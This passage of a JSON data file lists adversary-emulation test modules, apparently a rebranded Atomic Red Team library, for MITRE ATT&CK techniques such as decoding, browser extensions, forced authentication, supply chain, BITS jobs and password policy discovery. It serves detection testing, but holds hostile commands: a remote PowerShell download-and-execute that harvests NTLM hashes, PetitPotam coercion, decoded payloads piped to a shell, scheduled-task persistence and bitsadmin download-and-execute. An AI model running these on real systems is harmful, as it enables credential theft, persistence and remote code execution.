        "command": "ENCODED=$(echo '#{message}' | base64)\nprintf $ENCODED | base64 -d\necho $ENCODED | base64 -d\necho $(echo $ENCODED) | base64 -d\necho $ENCODED > #{encoded_file} && base64 -d #{encoded_file}\necho $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d\nbash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "message",
          "description": "Message to print to the screen",
          "type": "string",
          "default_value": "Hello from RAGLOX Threat Library test T1140!"
        },
        {
          "name": "encoded_file",
          "description": "File to temporarily save encoded text",
          "type": "path",
          "default_value": "/tmp/T1140.encoded"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e",
      "module_name": "Base64 decoding with shell utilities"
    },
    {
      "index": 892,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ENCODED=$(echo '#{message}' | b64encode -r -)\nprintf $ENCODED | b64decode -r\necho $ENCODED | b64decode -r\necho $(echo $ENCODED) | b64decode -r\necho $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}\necho $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "message",
          "description": "Message to print to the screen",
          "type": "string",
          "default_value": "Hello from RAGLOX Threat Library test T1140!"
        },
        {
          "name": "encoded_file",
          "description": "File to temporarily save encoded text",
          "type": "path",
          "default_value": "/tmp/T1140.encoded"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b6097712-c42e-4174-b8f2-4b1e1a5bbb3d",
      "module_name": "Base64 decoding with shell utilities (freebsd)"
    },
    {
      "index": 893,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Using b64decode shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo #{bash_encoded} | b64decode -r | sh\necho #{dash_encoded} | b64decode -r | sh\necho #{fish_encoded} | b64decode -r | sh\necho #{sh_encoded} | b64decode -r | sh\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "bash_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
        },
        {
          "name": "dash_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
        },
        {
          "name": "fish_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
        },
        {
          "name": "sh_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"
        }
      ],
      "prerequisites": [
        {
          "description": "b64decode must be present\n",
          "check_command": "which b64decode\n",
          "install_command": "echo \"please install b64decode\"\n"
        }
      ],
      "rx_module_id": "18ee2002-66e8-4518-87c5-c0ec9c8299ac",
      "module_name": "FreeBSD b64encode Shebang in CLI"
    },
    {
      "index": 894,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "ENCODED=$(echo '#{message}' | xxd -ps -c 256)\nprintf $ENCODED | xxd -r -p\necho $ENCODED | xxd -r -p\necho $(echo $ENCODED) | xxd -r -p\necho $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file}\necho $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file}\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "message",
          "description": "Message to print to the screen",
          "type": "string",
          "default_value": "Hello from RAGLOX Threat Library test T1140!"
        },
        {
          "name": "encoded_file",
          "description": "File to temporarily save encoded text",
          "type": "path",
          "default_value": "/tmp/T1140.encoded"
        }
      ],
      "prerequisites": [
        {
          "description": "xxd must be present\n",
          "check_command": "which xxd\n",
          "install_command": "echo \"Please install xxd\"\n"
        }
      ],
      "rx_module_id": "005943f9-8dd5-4349-8b46-0313c0a9f973",
      "module_name": "Hex decoding with shell utilities"
    },
    {
      "index": 895,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "echo #{bash_encoded} | base64 -d | bash\necho #{dash_encoded} | base64 -d | bash\necho #{fish_encoded} | base64 -d | bash\necho #{sh_encoded} | base64 -d | bash\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "bash_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
        },
        {
          "name": "dash_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
        },
        {
          "name": "fish_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo="
        },
        {
          "name": "sh_encoded",
          "description": "Encoded",
          "type": "string",
          "default_value": "IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK"
        }
      ],
      "prerequisites": [
        {
          "description": "base64 must be present\n",
          "check_command": "which base64\n",
          "install_command": "echo \"please install base64\"\n"
        }
      ],
      "rx_module_id": "3a15c372-67c1-4430-ac8e-ec06d641ce4d",
      "module_name": "Linux Base64 Encoded Shebang in CLI"
    },
    {
      "index": 896,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "An adversary can obfuscate malicious commands or payloads using XOR and execute them on the victim's machine. This test uses Python to decode and execute commands on the machine.",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "bash",
        "command": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"#{encrypted_command}\"; key = \"#{xor_key}\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "xor_key",
          "description": "Key used to decrypt the command ",
          "type": "string",
          "default_value": "waEHleblxiQjoxFJQaIMLdHKz"
        },
        {
          "name": "encrypted_command",
          "description": "Encrypted command that will be executed",
          "type": "string",
          "default_value": "AAkqKQEM"
        }
      ],
      "prerequisites": [
        {
          "description": "Python3 must be installed",
          "check_command": "which python3",
          "install_command": "echo \"Install Python3\""
        }
      ],
      "rx_module_id": "c3b65cd5-ee51-4e98-b6a3-6cbdec138efc",
      "module_name": "XOR decoding and command execution using Python"
    },
    {
      "index": 897,
      "technique_id": "T1140",
      "technique_name": "Deobfuscate/Decode Files or Information",
      "description": "Uses expand.exe to extract a file from a CAB created locally. This simulates adversarial use of expand on cabinet archives.\nUpon success, art-expand-source.txt is extracted next to the CAB.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir \"#{output_dir}\" >nul 2>&1\necho hello from raglox threat library > \"PathToRagloxModulesFolder\\T1140\\src\\art-expand-source.txt\"\nmakecab \"PathToRagloxModulesFolder\\T1140\\src\\art-expand-source.txt\" \"#{cab_path}\"\npushd \"#{output_dir}\"\nexpand \"#{cab_path}\" -F:* .\npopd\n",
        "elevation_required": false,
        "cleanup_command": "del \"PathToRagloxModulesFolder\\T1140\\src\\art-expand-source.txt\" >nul 2>&1\ndel \"#{cab_path}\" >nul 2>&1\nrmdir \"#{output_dir}\" /s /q >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "cab_path",
          "description": "Path to the CAB to expand (created if missing)",
          "type": "path",
          "default_value": "%TEMP%\\art-expand-test.cab"
        },
        {
          "name": "output_dir",
          "description": "Destination directory",
          "type": "path",
          "default_value": "%TEMP%\\art-expand-out"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9f8b1c54-cb76-4d5e-bb1f-2f5c0e8f5a11",
      "module_name": "Expand CAB with expand.exe"
    },
    {
      "index": 898,
      "technique_id": "T1176",
      "technique_name": "Browser Extensions",
      "description": "Turn on Chrome/Chromium developer mode and Load Extension found in the src directory",
      "execution": {
        "platforms": [
          "linux",
          "windows",
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3ecd790d-2617-4abf-9a8c-4e8d47da9ee1",
      "module_name": "Chrome/Chromium (Developer Mode)"
    },
    {
      "index": 899,
      "technique_id": "T1176",
      "technique_name": "Browser Extensions",
      "description": "Install the \"Minimum Viable Malicious Extension\" Chrome extension",
      "execution": {
        "platforms": [
          "linux",
          "windows",
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4c83940d-8ca5-4bb2-8100-f46dc914bc3f",
      "module_name": "Chrome/Chromium (Chrome Web Store)"
    },
    {
      "index": 900,
      "technique_id": "T1176",
      "technique_name": "Browser Extensions",
      "description": "Create a file called test.wma, with the duration of 30 seconds\n",
      "execution": {
        "platforms": [
          "linux",
          "windows",
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "cb790029-17e6-4c43-b96f-002ce5f10938",
      "module_name": "Firefox"
    },
    {
      "index": 901,
      "technique_id": "T1176",
      "technique_name": "Browser Extensions",
      "description": "Adversaries may use VPN extensions in an attempt to hide traffic sent from a compromised host. This will install one (of many) available VPNS in the Edge add-on store.\n",
      "execution": {
        "platforms": [
          "windows",
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3d456e2b-a7db-4af8-b5b3-720e7c4d9da5",
      "module_name": "Edge Chromium Addon - VPN"
    },
    {
      "index": 902,
      "technique_id": "T1176",
      "technique_name": "Browser Extensions",
      "description": "This test loads an unpacked extension in Google Chrome with the `--load-extension` parameter. This technique was previously used by the Grandoreiro malware to load a malicious extension that would capture the browsing history, steal cookies and other user information. Other malwares also leverage this technique to hijack searches, steal passwords, inject ads, and more.\n\nReferences:\nhttps://attack.mitre.org/techniques/T1176/\nhttps://securityintelligence.com/posts/grandoreiro-malware-now-targeting-banks-in-spain/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "\n# Chromium\n$chromium =  \"https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip\"\n\n# uBlock Origin Lite to test side-loading\n$extension = \"https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip\"\n\nSet-Location \"#{working_dir}\"\n\nSet-Variable ProgressPreference SilentlyContinue\nInvoke-WebRequest -URI $chromium -OutFile \"#{working_dir}\\chrome.zip\"\nInvoke-WebRequest -URI $extension -OutFile \"#{working_dir}\\extension.zip\"\n\n\nExpand-Archive chrome.zip -DestinationPath \"#{working_dir}\" -Force\nExpand-Archive extension.zip -Force\n\nStart-Process .\\chrome-win\\chrome.exe --load-extension=\"#{working_dir}\\extension\\\" -PassThru",
        "elevation_required": true,
        "cleanup_command": "Set-Location \"#{working_dir}\"\nStop-Process -Name chrome -Force\nRemove-Item .\\chrome.zip, .\\chrome-win, .\\extension, .\\extension.zip -Recurse -Force\nSet-Variable ProgressPreference Continue"
      },
      "variables": [
        {
          "name": "working_dir",
          "description": "Working directory where the files will be downloaded and extracted",
          "type": "string",
          "default_value": "$env:TEMP"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7a714703-9f6b-461c-b06d-e6aeac650f27",
      "module_name": "Google Chrome Load Unpacked Extension With Command Line"
    },
    {
      "index": 903,
      "technique_id": "T1187",
      "technique_name": "Forced Authentication",
      "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"#{petitpotam_path}\" #{captureServerIP} #{targetServerIP} #{efsApi}\nWrite-Host \"End of PetitPotam attack\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "captureServerIP",
          "description": "Computer IP to use to receive the authentication (ex. attacker machine used for NTLM relay)",
          "type": "string",
          "default_value": "10.0.0.3"
        },
        {
          "name": "targetServerIP",
          "description": "Computer IP to force authentication from (ex. domain controller)",
          "type": "string",
          "default_value": "10.0.0.2"
        },
        {
          "name": "efsApi",
          "description": "EFS API to use to coerce authentication",
          "type": "integer",
          "default_value": 1
        },
        {
          "name": "petitpotam_path",
          "description": "PetitPotam Windows executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\PetitPotam.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "PetitPotam binary must exist on disk and at specified location (#{petitpotam_path}).\nAnd the computer must be domain joined (implicit authentication).\n",
          "check_command": "if (Test-Path \"#{petitpotam_path}\") { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/topotam/PetitPotam/blob/2ae559f938e67d0cd59c5afcaac67672b9ef2981/PetitPotam.exe?raw=true\" -OutFile \"#{petitpotam_path}\"\n"
        }
      ],
      "rx_module_id": "485ce873-2e65-4706-9c7e-ae3ab9e14213",
      "module_name": "PetitPotam"
    },
    {
      "index": 904,
      "technique_id": "T1187",
      "technique_name": "Forced Authentication",
      "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')\nInvoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7f06b25c-799e-40f1-89db-999c9cc84317",
      "module_name": "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS"
    },
    {
      "index": 905,
      "technique_id": "T1187",
      "technique_name": "Forced Authentication",
      "description": "RpcPing command can be used to trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign flag not Set)\nRef: https://twitter.com/splinter_code/status/1421144623678988298",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "rpcping -s #{server_ip} -e #{custom_port} /a connect /u NTLM 1>$Null",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "custom_port",
          "description": "Specify the custom port number",
          "type": "integer",
          "default_value": "9997"
        },
        {
          "name": "server_ip",
          "description": "Specify the server IP address. If not specified, the loop back IP will be used",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "81cfdd7f-1f41-4cc5-9845-bb5149438e37",
      "module_name": "Trigger an authenticated RPC call to a target server with no Sign flag set"
    },
    {
      "index": 906,
      "technique_id": "T1195",
      "technique_name": "Supply Chain Compromise",
      "description": "This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n",
        "elevation_required": false,
        "cleanup_command": "schtasks /delete /tn ExplorerSync /F 2>null\ndel %temp%\\..\\Microsoft\\ExplorerSync.db 2>null\ndel %temp%\\ExplorerSync.db 2>null\n"
      },
      "variables": [
        {
          "name": "rat_payload",
          "description": "RAT dropper ExplorerSync.db",
          "type": "path",
          "default_value": "$env:TEMP\\ExplorerSync.db"
        }
      ],
      "prerequisites": [
        {
          "description": "ExplorerSync.db must exist on disk at specified location (#{rat_payload})\n",
          "check_command": "if (Test-Path #{rat_payload}) {exit 0} else {exit 1}\n",
          "install_command": "Out-File -FilePath \"#{rat_payload}\"\n"
        }
      ],
      "rx_module_id": "82a9f001-94c5-495e-9ed5-f530dbded5e2",
      "module_name": "Octopus Scanner Malware Open Source Supply Chain"
    },
    {
      "index": 907,
      "technique_id": "T1195.002",
      "technique_name": "Compromise Software Supply Chain",
      "description": "Launches a shortlived Kubernetes pod using the Node 18 image, initializes a minimal npm project in /tmp/test, and installs the specified npm package without audit/fund/packagelock options, simulating potentially suspicious package retrieval (e.g., typosquatting/dependency confusion) from within a container. The pod is deleted after execution.\n",
      "execution": {
        "platforms": [
          "containers",
          "linux"
        ],
        "executor_type": "bash",
        "command": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --attach --rm -i -- bash -lc \"mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "image_name",
          "description": "Name of the image",
          "type": "string",
          "default_value": "node:18"
        },
        {
          "name": "pod_name",
          "description": "Name of the pod",
          "type": "string",
          "default_value": "raglox-npm-install"
        },
        {
          "name": "package_name",
          "description": "NPM package to install",
          "type": "string",
          "default_value": "tinycolor"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed and configured",
          "check_command": "which kubectl",
          "install_command": "echo \"kubectl must be installed\""
        }
      ],
      "rx_module_id": "a9604672-cd46-493b-b58f-fd4124c22dd3",
      "module_name": "Simulate npm package installation on a Linux system"
    },
    {
      "index": 908,
      "technique_id": "T1197",
      "technique_name": "BITS Jobs",
      "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}\n",
        "elevation_required": false,
        "cleanup_command": "del #{local_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "Remote file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1197/T1197.md"
        },
        {
          "name": "local_file",
          "description": "Local file path to save downloaded file",
          "type": "path",
          "default_value": "%temp%\\bitsadmin1_flag.ps1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3c73d728-75fb-4180-a12f-6712864d7421",
      "module_name": "Bitsadmin Download (cmd)"
    },
    {
      "index": 909,
      "technique_id": "T1197",
      "technique_name": "BITS Jobs",
      "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item #{local_file} -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "Remote file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1197/T1197.md"
        },
        {
          "name": "local_file",
          "description": "Local file path to save downloaded file",
          "type": "path",
          "default_value": "$env:TEMP\\bitsadmin2_flag.ps1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f63b8bc4-07e5-4112-acba-56f646f3f0bc",
      "module_name": "Bitsadmin Download (PowerShell)"
    },
    {
      "index": 910,
      "technique_id": "T1197",
      "technique_name": "BITS Jobs",
      "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "bitsadmin.exe /create #{bits_job_name}\nbitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}\nbitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL\nbitsadmin.exe /resume #{bits_job_name}\nping -n 5 127.0.0.1 >nul 2>&1\nbitsadmin.exe /complete #{bits_job_name}\n",
        "elevation_required": false,
        "cleanup_command": "del #{local_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "command_path",
          "description": "Path of command to execute",
          "type": "path",
          "default_value": "C:\\Windows\\system32\\notepad.exe"
        },
        {
          "name": "bits_job_name",
          "description": "Name of BITS job",
          "type": "string",
          "default_value": "RAGLOXBITS"
        },
        {
          "name": "local_file",
          "description": "Local file path to save downloaded file",
          "type": "path",
          "default_value": "%temp%\\bitsadmin3_flag.ps1"
        },
        {
          "name": "remote_file",
          "description": "Remote file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1197/T1197.md"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "62a06ec5-5754-47d2-bcfc-123d8314c6ae",
      "module_name": "Persist, Download, & Execute"
    },
    {
      "index": 911,
      "technique_id": "T1197",
      "technique_name": "BITS Jobs",
      "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (-k netsvc -p -s BITS) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "set \"#{download_path}\" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr\n",
        "elevation_required": false,
        "cleanup_command": "del #{cleanup_path}\\#{cleanup_file} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "remote_file",
          "description": "Remote file to download",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1197/T1197.md"
        },
        {
          "name": "download_path",
          "description": "Local file path to save downloaded file",
          "type": "path",
          "default_value": "SYSTEMROOT=C:\\Windows\\Temp"
        },
        {
          "name": "cleanup_path",
          "description": "path to delete file as part of cleanup_command",
          "type": "path",
          "default_value": "C:\\Windows\\Temp\\Personalization\\LockScreenImage"
        },
        {
          "name": "cleanup_file",
          "description": "file to remove as part of cleanup_command",
          "type": "string",
          "default_value": "*.md"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "afb5e09e-e385-4dee-9a94-6ee60979d114",
      "module_name": "Bits download using desktopimgdownldr.exe (cmd)"
    },
    {
      "index": 912,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the password complexity policy to console on Ubuntu Linux.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cat /etc/pam.d/common-password\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "085fe567-ac84-47c7-ac4c-2688ce28265b",
      "module_name": "Examine password complexity policy - Ubuntu"
    },
    {
      "index": 913,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the password complexity policy to console on FreeBSD.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat /etc/pam.d/passwd\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "a7893624-a3d7-4aed-9676-80498f31820f",
      "module_name": "Examine password complexity policy - FreeBSD"
    },
    {
      "index": 914,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cat /etc/security/pwquality.conf\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "System must be CentOS or RHEL v7\n",
          "check_command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo Please run from CentOS or RHEL v7\n"
        }
      ],
      "rx_module_id": "78a12e65-efff-4617-bc01-88f17d71315d",
      "module_name": "Examine password complexity policy - CentOS/RHEL 7.x"
    },
    {
      "index": 915,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "System must be CentOS or RHEL v6\n",
          "check_command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n",
          "install_command": "echo Please run from CentOS or RHEL v6\n"
        }
      ],
      "rx_module_id": "6ce12552-0adb-4f56-89ff-95ce268f6358",
      "module_name": "Examine password complexity policy - CentOS/RHEL 6.x"
    },
    {
      "index": 916,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cat /etc/login.defs\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7c86c55c-70fa-4a05-83c9-3aa19b145d1a",
      "module_name": "Examine password expiration policy - All Linux"
    },
    {
      "index": 917,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the local password policy to console on Windows.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net accounts\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4588d243-f24e-4549-b2e3-e627acc089f6",
      "module_name": "Examine local password policy - Windows"
    },
    {
      "index": 918,
      "technique_id": "T1201",
      "technique_name": "Password Policy Discovery",
      "description": "Lists the domain password policy to console on Windows.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net accounts /domain\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "46c2c362-2679-4ef5-aec9-0e958e135be4",
      "module_name": "Examine domain password policy - Windows"
    },
    {
